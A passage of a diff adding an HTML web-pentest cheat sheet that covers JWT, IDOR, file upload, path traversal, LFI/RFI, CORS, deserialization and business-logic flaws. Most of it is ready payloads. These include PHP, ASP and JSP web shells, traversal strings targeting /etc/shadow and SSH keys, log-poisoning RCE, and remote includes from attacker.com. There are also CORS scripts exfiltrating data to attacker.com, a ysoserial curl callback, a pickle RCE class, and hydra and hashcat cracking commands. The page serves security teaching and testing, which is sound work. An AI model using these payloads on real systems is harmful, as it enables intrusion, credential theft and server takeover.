+// Valid user: "Password is incorrect"
+// Invalid user: "User does not exist"
+
+// Brute force usernames:
+admin, administrator, root, user, test, info, webmaster, support</div></div>
+    <div class="payload-group"><div class="payload-title">Password Reset Flaws</div>
+<div class="code-block red">// Host header injection in reset email:
+POST /reset-password
+Host: attacker.com  ← inject here
+
+// Predictable reset token
+// Token in URL (Referer leak)
+// Token not expiring
+// Reuse of old tokens</div></div>
+    <div class="payload-group"><div class="payload-title">Session Token Testing</div>
+<div class="code-block purple">// Collect multiple tokens and analyze entropy
+// Test if token is base64/JWT/sequential
+// Test session fixation:
+//   1. Get session ID before login
+//   2. Log in
+//   3. Check if session ID changed (if not → fixation vuln)
+
+// Test session termination:
+//   After logout, use old session token - does it still work?</div></div>
+    <div class="payload-group"><div class="payload-title">MFA Bypass</div>
+<div class="code-block">// Response manipulation: change "success":false to "success":true
+// Code brute force: try 000000-999999 (if no rate limit)
+// Use backup codes
+// Skip MFA step entirely by going directly to post-auth URL
+// Response body tamper after MFA check</div></div>
+    <div class="section-label">Tools</div>
+    <div class="tools-row"><span class="tool-badge">Burp Suite Intruder</span><span class="tool-badge">Hydra</span><span class="tool-badge">Medusa</span><span class="tool-badge">Patator</span></div>
+<div class="code-block green">hydra -L users.txt -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"
+</div>
+    <div class="section-label">Impact</div>
+    <ul class="impact-list"><li>Account takeover</li><li>Privilege escalation</li><li>Full application compromise</li></ul>
+    <div class="section-label">References</div>
+    <ul class="ref-list">
+      <li><a href="https://portswigger.net/web-security/authentication" target="_blank">PortSwigger Authentication Labs</a></li>
+      <li><a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" target="_blank">OWASP A07: Auth Failures</a></li>
+    </ul>
+  </div>
+</div>
+
+<!-- ==================== V16: IDOR ==================== -->
+<div class="vuln-card" id="v16">
+  <div class="vuln-header" onclick="toggleCard(this)">
+    <div class="vuln-num">16</div>
+    <div class="vuln-title-block">
+      <div class="vuln-name">INSECURE DIRECT OBJECT REFERENCE (IDOR)</div>
+      <div class="vuln-short">Accessing or modifying resources by guessing/changing object identifiers without authorization checks.</div>
+    </div>
+    <div class="severity-badge sev-high">HIGH</div>
+    <span class="chevron">▾</span>
+  </div>
+  <div class="vuln-body">
+    <div class="section-label">Where to Test</div>
+    <ul class="location-list"><li>User IDs in URLs</li><li>Order IDs</li><li>File names</li><li>API endpoints</li><li>Account numbers</li><li>Document IDs</li></ul>
+    <div class="section-label">Detection & Exploitation</div>
+<div class="code-block orange">// Numeric ID manipulation
+GET /api/user/1001       → change to /api/user/1000
+GET /invoice?id=5432     → change to /invoice?id=5431
+DELETE /api/post/99      → try another user's post ID
+
+// UUID/GUID (harder but possible)
+GET /api/orders/a4b12c3d-... → find other UUIDs via leakage
+
+// Parameter pollution
+GET /api/profile?userId=1001&userId=1000
+
+// HTTP method switching
+POST /api/user/1001 → PUT /api/user/1000
+
+// Encoded IDs
+base64: dXNlcjoxMDAx → decode → user:1001 → change to user:1000 → encode
+
+// Mass assignment / JSON parameter abuse
+{"id": 1001} → change to {"id": 1000}
+{"userId": "me"} → change to {"userId": "admin"}</div>
+    <div class="section-label">IDOR Types</div>
+    <div class="field-row"><strong>Types to Test</strong>
+Horizontal IDOR: Access another user's same-level resource<br>
+Vertical IDOR: Access higher-privilege resource (admin panel)<br>
+Blind IDOR: No direct response, but data modified<br>
+Reference in body: JSON/XML body parameter<br>
+Reference in cookie: Session or user tracking cookie</div>
+    <div class="section-label">Tools</div>
+    <div class="tools-row"><span class="tool-badge">Burp Suite (Authorize extension)</span><span class="tool-badge">AuthMatrix</span></div>
+    <div class="section-label">Impact</div>
+    <ul class="impact-list"><li>Unauthorized data access</li><li>Account takeover</li><li>Data modification/deletion</li></ul>
+    <div class="section-label">References</div>
+    <ul class="ref-list">
+      <li><a href="https://portswigger.net/web-security/access-control/idor" target="_blank">PortSwigger IDOR</a></li>
+      <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References" target="_blank">OWASP IDOR Testing</a></li>
+    </ul>
+  </div>
+</div>
+
+<!-- ==================== V17: JWT ==================== -->
+<div class="vuln-card" id="v17">
+  <div class="vuln-header" onclick="toggleCard(this)">
+    <div class="vuln-num">17</div>
+    <div class="vuln-title-block">
+      <div class="vuln-name">JWT VULNERABILITIES</div>
+      <div class="vuln-short">Exploiting weak JWT implementations: algorithm confusion, none algorithm, weak secrets.</div>
+    </div>
+    <div class="severity-badge sev-critical">CRITICAL</div>
+    <span class="chevron">▾</span>
+  </div>
+  <div class="vuln-body">
+    <div class="section-label">JWT Structure</div>
+    <div class="field-row"><strong>Format</strong>header.payload.signature (base64url encoded)<br>
+Decode: echo "eyJ..." | base64 -d</div>
+    <div class="section-label">Attack Techniques</div>
+    <div class="payload-group"><div class="payload-title">1. None Algorithm Attack</div>
+<div class="code-block orange">// Modify header to:
+{"alg": "none", "typ": "JWT"}
+// Remove signature (trailing dot remains)
+// eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.</div></div>
+    <div class="payload-group"><div class="payload-title">2. Weak Secret Brute Force</div>
+<div class="code-block green">hashcat -a 0 -m 16500 jwt_token.txt wordlist.txt
+john --wordlist=wordlist.txt --format=HMAC-SHA256 jwt.txt
+# Common weak secrets: secret, password, 123456, jwt_secret</div></div>
+    <div class="payload-group"><div class="payload-title">3. RS256 to HS256 Algorithm Confusion</div>
+<div class="code-block purple">// If server uses RS256, get public key (often exposed)
+// Sign JWT with public key using HS256
+// Server may verify HS256 using the public key as secret
+// Tools: jwt_tool, portswigger jwt editor</div></div>
+    <div class="payload-group"><div class="payload-title">4. JWK Header Injection</div>
+<div class="code-block red">// Modify header to include your own public key:
+{
+  "alg": "RS256",
+  "jwk": {
+    "kty": "RSA",
+    "e": "AQAB",
+    "n": "attacker-public-key-n..."
+  }
+}
+// Sign with corresponding private key</div></div>
+    <div class="payload-group"><div class="payload-title">5. Kid Parameter Injection</div>
+<div class="code-block">// kid = key ID used to select signing key
+// Inject SQL into kid:
+{"kid": "' UNION SELECT 'attacker_secret' --"}
+// Or path traversal:
+{"kid": "../../dev/null"}  // sign with empty key</div></div>
+    <div class="payload-group"><div class="payload-title">6. Claim Manipulation</div>
+<div class="code-block orange">// Decode → modify claims → re-sign (if secret known)
+{"sub": "user123"} → {"sub": "admin"}
+{"role": "user"}   → {"role": "admin"}
+{"exp": 1700000000} → {"exp": 9999999999}  // never expires</div></div>
+    <div class="section-label">Tools</div>
+    <div class="tools-row"><span class="tool-badge">jwt_tool</span><span class="tool-badge">Burp JWT Editor</span><span class="tool-badge">hashcat</span><span class="tool-badge">jwt.io</span></div>
+<div class="code-block green">python3 jwt_tool.py -t https://target.com -rh "Authorization: Bearer JWT" -M at
+python3 jwt_tool.py JWT -X a  # None algorithm attack
+python3 jwt_tool.py JWT -C -d wordlist.txt  # Crack secret</div>
+    <div class="section-label">Impact</div>
+    <ul class="impact-list"><li>Authentication bypass</li><li>Privilege escalation</li><li>Account takeover</li></ul>
+    <div class="section-label">References</div>
+    <ul class="ref-list">
+      <li><a href="https://portswigger.net/web-security/jwt" target="_blank">PortSwigger JWT Labs</a></li>
+      <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token" target="_blank">PayloadsAllTheThings - JWT</a></li>
+    </ul>
+  </div>
+</div>
+
+<!-- ==================== V18: OAUTH ==================== -->
+<div class="vuln-card" id="v18">
+  <div class="vuln-header" onclick="toggleCard(this)">
+    <div class="vuln-num">18</div>
+    <div class="vuln-title-block">
+      <div class="vuln-name">OAUTH 2.0 FLAWS</div>
+      <div class="vuln-short">Misconfigured OAuth flows leading to account takeover via token/code theft.</div>
+    </div>
+    <div class="severity-badge sev-high">HIGH</div>
+    <span class="chevron">▾</span>
+  </div>
+  <div class="vuln-body">
+    <div class="section-label">Common Vulnerabilities</div>
+<div class="code-block orange">// 1. Open redirect in redirect_uri
+/oauth/authorize?client_id=X&redirect_uri=https://attacker.com/callback
+
+// 2. State parameter missing (CSRF on OAuth)
+// No state= parameter → forge auth request → steal code
+
+// 3. Authorization code interception
+// Referrer header leaks code to third-party resources on callback page
+
+// 4. Token leakage in browser history (implicit flow)
+// Token in URL fragment → logged in browser history
+
+// 5. Scope escalation
+// Request: scope=email
+// Replay with: scope=email%20profile%20admin
+
+// 6. PKCE bypass
+// code_challenge_method=plain → weak protection
+
+// 7. Account linking abuse
+// Link attacker-controlled email to victim account via OAuth
+
+// 8. JWT none algorithm in ID token
+// See JWT section</div>
+    <div class="section-label">Tools</div>
+    <div class="tools-row"><span class="tool-badge">Burp Suite</span><span class="tool-badge">OAuth 2.0 tester</span></div>
+    <div class="section-label">References</div>
+    <ul class="ref-list">
+      <li><a href="https://portswigger.net/web-security/oauth" target="_blank">PortSwigger OAuth Labs</a></li>
+      <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery" target="_blank">OWASP OAuth Testing</a></li>
+    </ul>
+  </div>
+</div>
+
+<!-- ==================== V19: FILE UPLOAD ==================== -->
+<div class="vuln-card" id="v19">
+  <div class="vuln-header" onclick="toggleCard(this)">
+    <div class="vuln-num">19</div>
+    <div class="vuln-title-block">
+      <div class="vuln-name">FILE UPLOAD VULNERABILITIES</div>
+      <div class="vuln-short">Uploading malicious files (webshells) to achieve RCE on the server.</div>
+    </div>
+    <div class="severity-badge sev-critical">CRITICAL</div>
+    <span class="chevron">▾</span>
+  </div>
+  <div class="vuln-body">
+    <div class="section-label">Attack Vectors</div>
+    <div class="payload-group"><div class="payload-title">Web Shell Payloads</div>
+<div class="code-block orange">// PHP Web Shell
+<?php system($_GET['cmd']); ?>
+<?php echo shell_exec($_REQUEST['cmd']); ?>
+<?php passthru($_GET['c']); ?>
+<?php eval($_POST['code']); ?>
+
+// ASP Web Shell
+<% eval request("cmd") %>
+
+// JSP Web Shell
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+
+// Simple PHP shell as image
+// Prepend GIF header, save as shell.php:
+GIF89a;<?php system($_GET['cmd']); ?></div></div>
+    <div class="payload-group"><div class="payload-title">Extension Bypass Techniques</div>
+<div class="code-block red">// Double extension
+shell.php.jpg
+shell.jpg.php
+
+// Null byte (old servers)
+shell.php%00.jpg
+shell.php\0.jpg
+
+// Case variation
+shell.pHp
+shell.PHP
+shell.PhP
+
+// Less common extensions (check server config)
+shell.php3
+shell.php4
+shell.php5
+shell.phtml
+shell.phar
+shell.shtml
+shell.shtm
+
+// Alternative extension with .htaccess trick:
+// Upload .htaccess with: AddType application/x-httpd-php .jpg
+// Then upload shell.jpg</div></div>
+    <div class="payload-group"><div class="payload-title">Content-Type Bypass</div>
+<div class="code-block purple">// Change MIME type in request:
+Content-Type: image/jpeg   ← even if file is PHP
+Content-Type: image/gif
+Content-Type: image/png
+
+// Add magic bytes to PHP shell:
+GIF89a; <?php system($_GET['cmd']); ?>
+// Or JPEG magic: \xff\xd8\xff\xe0 then PHP code</div></div>
+    <div class="payload-group"><div class="payload-title">SVG/XML XSS via Upload</div>
+<div class="code-block"><?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
+  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" xmlns="http://www.w3.org/2000/svg"
+     onload="alert(document.cookie)">
+  <circle cx="50" cy="50" r="50"/>
+</svg></div></div>
+    <div class="payload-group"><div class="payload-title">Path Traversal in Filename</div>
+<div class="code-block">// Filename in upload:
+../../../var/www/html/shell.php
+..%2F..%2Fshell.php
+....//shell.php</div></div>
+    <div class="section-label">Testing Method</div>
+    <div class="field-row"><strong>Steps</strong>
+1. Upload .php file → observe if blocked (check extension, MIME, magic bytes)<br>
+2. Bypass extension checks (see above)<br>
+3. Bypass MIME type checks (modify Content-Type)<br>
+4. Find the upload directory (robots.txt, forced browsing)<br>
+5. Request uploaded file to trigger execution</div>
+    <div class="section-label">Tools</div>
+    <div class="tools-row"><span class="tool-badge">Burp Suite</span><span class="tool-badge">weevely</span><span class="tool-badge">fuzz-ext list</span></div>
+    <div class="section-label">Impact</div>
+    <ul class="impact-list"><li>Remote Code Execution</li><li>Full server takeover</li><li>Data exfiltration</li><li>Malware hosting</li></ul>
+    <div class="section-label">References</div>
+    <ul class="ref-list">
+      <li><a href="https://portswigger.net/web-security/file-upload" target="_blank">PortSwigger File Upload Labs</a></li>
+      <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files" target="_blank">PayloadsAllTheThings - File Upload</a></li>
+    </ul>
+  </div>
+</div>
+
+<!-- ==================== V20: PATH TRAVERSAL ==================== -->
+<div class="vuln-card" id="v20">
+  <div class="vuln-header" onclick="toggleCard(this)">
+    <div class="vuln-num">20</div>
+    <div class="vuln-title-block">
+      <div class="vuln-name">PATH TRAVERSAL / DIRECTORY TRAVERSAL</div>
+      <div class="vuln-short">Reading arbitrary files outside web root using ../ sequences in file parameters.</div>
+    </div>
+    <div class="severity-badge sev-high">HIGH</div>
+    <span class="chevron">▾</span>
+  </div>
+  <div class="vuln-body">
+    <div class="section-label">Where to Test</div>
+    <ul class="location-list"><li>File download params</li><li>Image display params</li><li>Template includes</li><li>Language files</li><li>PDF generation</li></ul>
+    <div class="section-label">Payloads</div>
+<div class="code-block orange">// Basic
+../../../etc/passwd
+../../etc/passwd
+../etc/passwd
+
+// URL encoded
+..%2F..%2F..%2Fetc%2Fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+
+// Double URL encoded
+..%252F..%252F..%252Fetc%252Fpasswd
+
+// Unicode / UTF-8
+..%c0%af..%c0%afetc%c0%afpasswd
+..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd
+
+// Null byte (old PHP)
+../../../etc/passwd%00.jpg
+
+// Windows
+..\..\..\windows\win.ini
+..\..\..\..\windows\system32\drivers\etc\hosts
+%WINDIR%\win.ini
+
+// With prefix bypass (if app adds prefix)
+....//....//....//etc/passwd
+....\/....\/etc/passwd
+
+// Absolute path
+/etc/passwd
+C:\windows\win.ini</div>
+    <div class="section-label">Common Target Files</div>
+<div class="code-block green">// Linux
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/issue
+/proc/self/environ
+/proc/self/cmdline
+/proc/net/tcp
+/var/log/apache2/access.log  (LFI to RCE via log poisoning)
+/var/log/nginx/access.log
+~/.ssh/id_rsa
+~/.bash_history
+/var/www/html/config.php
+
+// Windows
+C:\windows\win.ini
+C:\boot.ini
+C:\inetpub\wwwroot\web.config
+C:\windows\system32\drivers\etc\hosts</div>
+    <div class="section-label">Tools</div>
+    <div class="tools-row"><span class="tool-badge">dotdotpwn</span><span class="tool-badge">Burp Suite</span><span class="tool-badge">ffuf</span></div>
+<div class="code-block green">dotdotpwn -m http -h target.com -f /etc/passwd -k "root:"</div>
+    <div class="section-label">Impact</div>
+    <ul class="impact-list"><li>Read server configuration</li><li>SSH private key theft</li><li>Source code disclosure</li><li>Credential exposure</li></ul>
+    <div class="section-label">References</div>
+    <ul class="ref-list">
+      <li><a href="https://portswigger.net/web-security/file-path-traversal" target="_blank">PortSwigger Path Traversal</a></li>
+      <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal" target="_blank">PayloadsAllTheThings - Path Traversal</a></li>
+    </ul>
+  </div>
+</div>
+
+<!-- ==================== V21: LFI/RFI ==================== -->
+<div class="vuln-card" id="v21">
+  <div class="vuln-header" onclick="toggleCard(this)">
+    <div class="vuln-num">21</div>
+    <div class="vuln-title-block">
+      <div class="vuln-name">LOCAL / REMOTE FILE INCLUSION (LFI / RFI)</div>
+      <div class="vuln-short">Including local or remote files in server-side code execution, often leading to RCE.</div>
+    </div>
+    <div class="severity-badge sev-critical">CRITICAL</div>
+    <span class="chevron">▾</span>
+  </div>
+  <div class="vuln-body">
+    <div class="section-label">Detection</div>
+<div class="code-block">// Look for params like:
+?page=home
+?file=index
+?template=main
+?include=header
+?lang=en
+
+// Test with:
+?page=../../../etc/passwd
+?file=../../../../etc/hosts</div>
+    <div class="section-label">LFI Payloads</div>
+<div class="code-block orange">// Basic
+?page=../../../etc/passwd
+?file=../../../../etc/shadow
+
+// PHP Wrappers
+?page=php://filter/convert.base64-encode/resource=index.php  // Read PHP source
+?page=php://filter/read=string.rot13/resource=index.php
+?page=php://input  // with POST: <?php system('id');?>
+?page=data://text/plain,<?php system('id');?>
+?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+Cg==
+?page=phar://./upload/evil.zip/shell  // PHAR deserialization
+
+// Null byte bypass (PHP < 5.3)
+?page=../../../etc/passwd%00
+?page=../../../etc/passwd%00.php</div>
+    <div class="section-label">LFI to RCE</div>
+<div class="code-block red">// Log Poisoning - inject PHP code in User-Agent:
+User-Agent: <?php system($_GET['cmd']); ?>
+// Then include:
+?page=../../../var/log/apache2/access.log&cmd=id
+
+// Proc environ injection:
+?page=/proc/self/environ  // If env vars user-controlled
+
+// Session file:
+?page=/var/lib/php/sessions/sess_[your_session_id]
+// Set session var to: <?php system($_GET['cmd']); ?></div>
+    <div class="section-label">RFI Payloads</div>
+<div class="code-block purple">// requires: allow_url_include=On (PHP)
+?page=http://attacker.com/shell.txt
+?page=http://attacker.com/shell.php
+?page=ftp://attacker.com/shell.txt
+?page=//attacker.com/shell.txt  (SMB)</div>
+    <div class="section-label">Tools</div>
+    <div class="tools-row"><span class="tool-badge">LFISuite</span><span class="tool-badge">liffy</span><span class="tool-badge">Burp Suite</span><span class="tool-badge">ffuf</span></div>
+    <div class="section-label">Impact</div>
+    <ul class="impact-list"><li>Source code disclosure</li><li>Credential theft</li><li>RCE via log poisoning</li></ul>
+    <div class="section-label">References</div>
+    <ul class="ref-list">
+      <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" target="_blank">PayloadsAllTheThings - LFI/RFI</a></li>
+    </ul>
+  </div>
+</div>
+
+<!-- ==================== V22: CORS ==================== -->
+<div class="vuln-card" id="v22">
+  <div class="vuln-header" onclick="toggleCard(this)">
+    <div class="vuln-num">22</div>
+    <div class="vuln-title-block">
+      <div class="vuln-name">CORS MISCONFIGURATION</div>
+      <div class="vuln-short">Overly permissive CORS headers allowing malicious sites to read cross-origin responses.</div>
+    </div>
+    <div class="severity-badge sev-high">HIGH</div>
+    <span class="chevron">▾</span>
+  </div>
+  <div class="vuln-body">
+    <div class="section-label">Detection</div>
+<div class="code-block">// Send request with Origin header, check response:
+Origin: https://attacker.com
+
+// Vulnerable response:
+Access-Control-Allow-Origin: https://attacker.com
+Access-Control-Allow-Credentials: true
+
+// Test origins:
+Origin: https://attacker.com
+Origin: null
+Origin: https://target.com.attacker.com
+Origin: https://attacker.target.com</div>
+    <div class="section-label">Exploitation PoC</div>
+<div class="code-block orange">// Host on attacker.com:
+<script>
+var req = new XMLHttpRequest();
+req.onload = function() {
+  // Exfil response data
+  fetch('https://attacker.com/steal?data=' + btoa(this.responseText));
+}
+req.open('GET','https://target.com/api/user',true);
+req.withCredentials = true;
+req.send();
+</script>
+
+// Fetch API PoC
+<script>
+fetch('https://target.com/api/profile', {credentials: 'include'})
+  .then(r => r.text())
+  .then(data => fetch('https://attacker.com/steal?d='+btoa(data)));
+</script></div>
+    <div class="section-label">CORS Bypass Techniques</div>
+<div class="code-block red">// Origin: null (for sandboxed iframes)
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
+  src="data:text/html,<script>var req=new XMLHttpRequest();
+  req.open('GET','https://target.com/api/',true);
+  req.withCredentials=true;
+  req.onload=()=>location='https://attacker.com/?d='+req.responseText;
+  req.send();</script>">
+</iframe></div>
+    <div class="section-label">Tools</div>
+    <div class="tools-row"><span class="tool-badge">Burp Suite</span><span class="tool-badge">CORSy</span><span class="tool-badge">cors-poc.py</span></div>
+    <div class="section-label">Impact</div>
+    <ul class="impact-list"><li>Sensitive data theft from authenticated sessions</li><li>Account takeover via CSRF-like attacks</li></ul>
+    <div class="section-label">References</div>
+    <ul class="ref-list">
+      <li><a href="https://portswigger.net/web-security/cors" target="_blank">PortSwigger CORS Labs</a></li>
+      <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration" target="_blank">PayloadsAllTheThings - CORS</a></li>
+    </ul>
+  </div>
+</div>
+
+<!-- ==================== V23: SECURITY MISCONFIG ==================== -->
+<div class="vuln-card" id="v23">
+  <div class="vuln-header" onclick="toggleCard(this)">
+    <div class="vuln-num">23</div>
+    <div class="vuln-title-block">
+      <div class="vuln-name">SECURITY MISCONFIGURATION</div>
+      <div class="vuln-short">Exposed admin panels, default credentials, unnecessary services, missing security headers.</div>
+    </div>
+    <div class="severity-badge sev-high">HIGH</div>
+    <span class="chevron">▾</span>
+  </div>
+  <div class="vuln-body">
+    <div class="section-label">Checklist</div>
+<div class="code-block orange">// 1. Missing Security Headers (check with curl -I):
+Strict-Transport-Security (HSTS)
+Content-Security-Policy (CSP)
+X-Frame-Options
+X-Content-Type-Options
+Referrer-Policy
+Permissions-Policy
+X-XSS-Protection
+
+// 2. Exposed admin interfaces
+/admin
+/phpmyadmin
+/wp-admin
+/manager (Tomcat)
+/actuator (Spring Boot - exposes /actuator/env, /actuator/heapdump)
+/console (JBoss/WebLogic)
+/.git/  (source code exposure)
+/.env   (environment variables)
+/swagger-ui.html (API docs exposure)
+/api-docs
+/graphql (introspection enabled)
+
+// 3. Default credentials
+admin:admin  (phpMyAdmin, routers)
+tomcat:tomcat  (Tomcat manager)
+admin:password (various)
+elastic: (Elasticsearch no auth)
+
+// 4. Directory listing enabled
+// Check: response contains "Index of /"
+
+// 5. Sensitive files
+robots.txt  (may reveal hidden paths)
+sitemap.xml
+crossdomain.xml
+.htaccess
+backup.zip / backup.tar.gz
+/WEB-INF/web.xml
+/META-INF/</div>
+    <div class="section-label">HTTP Security Headers Test</div>
+<div class="code-block green">curl -I https://target.com
+# OR use:
+securityheaders.com
+observatory.mozilla.org</div>
+    <div class="section-label">Tools</div>
+    <div class="tools-row"><span class="tool-badge">Nikto</span><span class="tool-badge">Nmap</span><span class="tool-badge">gobuster</span><span class="tool-badge">ffuf</span><span class="tool-badge">nuclei</span></div>
+<div class="code-block green">nikto -h https://target.com
+nuclei -u https://target.com -t misconfiguration/
+gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt</div>
+    <div class="section-label">Impact</div>
+    <ul class="impact-list"><li>Information disclosure</li><li>Admin access via defaults</li><li>Source code theft</li><li>XSS via missing CSP</li></ul>
+    <div class="section-label">References</div>
+    <ul class="ref-list">
+      <li><a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" target="_blank">OWASP A05: Security Misconfiguration</a></li>
+    </ul>
+  </div>
+</div>
+
+<!-- ==================== V24: OPEN REDIRECT ==================== -->
+<div class="vuln-card" id="v24">
+  <div class="vuln-header" onclick="toggleCard(this)">
+    <div class="vuln-num">24</div>
+    <div class="vuln-title-block">
+      <div class="vuln-name">OPEN REDIRECT</div>
+      <div class="vuln-short">Application redirects users to attacker-controlled URLs via unvalidated redirect parameters.</div>
+    </div>
+    <div class="severity-badge sev-medium">MEDIUM</div>
+    <span class="chevron">▾</span>
+  </div>
+  <div class="vuln-body">
+    <div class="section-label">Where to Test</div>
+    <ul class="location-list"><li>?next=URL</li><li>?redirect=URL</li><li>?url=URL</li><li>?return=URL</li><li>?goto=URL</li><li>?dest=URL</li><li>Login callbacks</li></ul>
+    <div class="section-label">Payloads</div>
+<div class="code-block orange">// Basic
+?next=https://attacker.com
+?redirect=//attacker.com
+?url=https://attacker.com
+
+// Bypass whitelisting
+?url=https://target.com.attacker.com
+?url=https://attacker.com?target.com
+?url=https://target.com@attacker.com
+?url=https://attacker.com/target.com
+?url=\/\/attacker.com
+?url=%2F%2Fattacker.com
+?url=%5C%5Cattacker.com
+?url=https:%252F%252Fattacker.com
+?url=javascript:alert(1)  // for XSS
+?url=data:text/html,<script>alert(1)</script>
+
+// Protocol-relative (browser resolves to https or http)
+?url=//attacker.com
+
+// CRLF + redirect
+?url=https://attacker.com%0d%0aLocation:https://evil.com</div>
+    <div class="section-label">Chaining with Other Attacks</div>
+    <div class="field-row"><strong>Open Redirect + OAuth</strong>Used to steal OAuth authorization codes via redirect_uri bypass</div>
+    <div class="field-row"><strong>Open Redirect + SSRF</strong>Chain with SSRF if server follows redirects</div>
+    <div class="section-label">Tools</div>
+    <div class="tools-row"><span class="tool-badge">Burp Suite</span><span class="tool-badge">OpenRedireX</span></div>
+    <div class="section-label">Impact</div>
+    <ul class="impact-list"><li>Phishing attacks</li><li>OAuth token theft</li><li>SSRF chaining</li></ul>
+    <div class="section-label">References</div>
+    <ul class="ref-list">
+      <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect" target="_blank">PayloadsAllTheThings - Open Redirect</a></li>
+    </ul>
+  </div>
+</div>
+
+<!-- ==================== V25: INSECURE DESERIALIZATION ==================== -->
+<div class="vuln-card" id="v25">
+  <div class="vuln-header" onclick="toggleCard(this)">
+    <div class="vuln-num">25</div>
+    <div class="vuln-title-block">
+      <div class="vuln-name">INSECURE DESERIALIZATION</div>
+      <div class="vuln-short">Deserializing attacker-controlled data triggers RCE via gadget chains in known libraries.</div>
+    </div>
+    <div class="severity-badge sev-critical">CRITICAL</div>
+    <span class="chevron">▾</span>
+  </div>
+  <div class="vuln-body">
+    <div class="section-label">Indicators of Serialized Data</div>
+<div class="code-block">// Java: starts with rO0AB... (base64) or 0xACED0005 (hex)
+// PHP: O:4:"User":1:{s:4:"name";s:5:"admin";}
+// Python: base64 encoded pickle
+// .NET: AAEAAAD.../BinaryFormatter
+// JSON with type information: {"@type":"java.lang.Class"}
+// ViewState: __VIEWSTATE parameter</div>
+    <div class="section-label">PHP Deserialization</div>
+<div class="code-block orange">// Test with modified object:
+O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
+
+// Magic method abuse: __wakeup, __destruct, __toString
+// Craft objects that call dangerous functions on deserialization</div>
+    <div class="section-label">Java Deserialization</div>
+<div class="code-block red">// Use ysoserial to generate gadget chain payloads:
+java -jar ysoserial.jar CommonsCollections1 "id" | base64
+java -jar ysoserial.jar CommonsCollections6 "curl http://attacker.com/$(id)" | base64
+java -jar ysoserial.jar Spring1 "id" | base64
+
+// Send as body or cookie where Java objects are consumed</div>
+    <div class="section-label">Python Pickle</div>
+<div class="code-block purple">import pickle, os, base64
+
+class Exploit(object):
+    def __reduce__(self):
+        return (os.system, ('id',))
+
+payload = base64.b64encode(pickle.dumps(Exploit())).decode()
+# Send as cookie or POST param</div>
+    <div class="section-label">.NET ViewState</div>
+<div class="code-block">// If MachineKey is known or default:
+ysoserial.net -g TypeConfuseDelegate -f LosFormatter -c "cmd /c whoami" | base64</div>
+    <div class="section-label">Tools</div>
+    <div class="tools-row"><span class="tool-badge">ysoserial</span><span class="tool-badge">ysoserial.net</span><span class="tool-badge">Burp Suite</span><span class="tool-badge">freddy (Burp ext)</span></div>
+    <div class="section-label">Impact</div>
+    <ul class="impact-list"><li>Remote Code Execution</li><li>Authentication bypass</li><li>Privilege escalation</li></ul>
+    <div class="section-label">References</div>
+    <ul class="ref-list">
+      <li><a href="https://portswigger.net/web-security/deserialization" target="_blank">PortSwigger Deserialization Labs</a></li>
+      <li><a href="https://github.com/frohoff/ysoserial" target="_blank">ysoserial - Java Gadget Chains</a></li>
+    </ul>
+  </div>
+</div>
+
+<!-- ==================== V26: BUSINESS LOGIC ==================== -->
+<div class="vuln-card" id="v26">
+  <div class="vuln-header" onclick="toggleCard(this)">
+    <div class="vuln-num">26</div>
+    <div class="vuln-title-block">
+      <div class="vuln-name">BUSINESS LOGIC FLAWS</div>
+      <div class="vuln-short">Exploiting application logic to perform unintended actions (price manipulation, workflow bypass).</div>
+    </div>
+    <div class="severity-badge sev-high">HIGH</div>
+    <span class="chevron">▾</span>
+  </div>
+  <div class="vuln-body">
+    <div class="section-label">Test Scenarios</div>
+<div class="code-block orange">// 1. Price Manipulation
+//    Modify price/quantity in POST body before checkout
+//    price=100 → price=-100 (negative price = credit)
+//    quantity=1 → quantity=-1
+//    Apply coupon multiple times
+
+// 2. Workflow Step Bypass
+//    Skip payment step: go directly from cart to /order-confirmed
+//    Replay POST without payment verification
+//    Modify order status in request
+
+// 3. Coupon/Promo Abuse
+//    Apply same coupon repeatedly
+//    Apply multiple conflicting discounts
+//    Use expired coupon with modified date
+
+// 4. Race Condition
+//    Double-spend by sending concurrent requests
+//    Two simultaneous "withdraw" API calls
+//    Use Burp Repeater → send group in parallel
+
+// 5. Limit Bypass
+//    Transfer more than account balance
+//    Integer overflow: quantity=9999999999 (overflow to small number)
+//    Submit form with negative values
+
+// 6. Privilege Escalation
+//    Change role=user to role=admin in API call
+//    Modify account_type=premium in request
+
+// 7. Two-Factor Auth Skip
+//    Complete first step, directly access post-2FA URL
+
+// 8. Mass Assignment
+//    Extra JSON fields in profile update:
+//    {"name":"test","is_admin":true,"credits":9999}</div>
+    <div class="section-label">Tools</div>
+    <div class="tools-row"><span class="tool-badge">Burp Suite</span><span class="tool-badge">Manual Analysis</span><span class="tool-badge">Turbo Intruder (race)</span></div>
+    <div class="section-label">Impact</div>
+    <ul class="impact-list"><li>Financial fraud</li><li>Privilege escalation</li><li>Data integrity violation</li></ul>
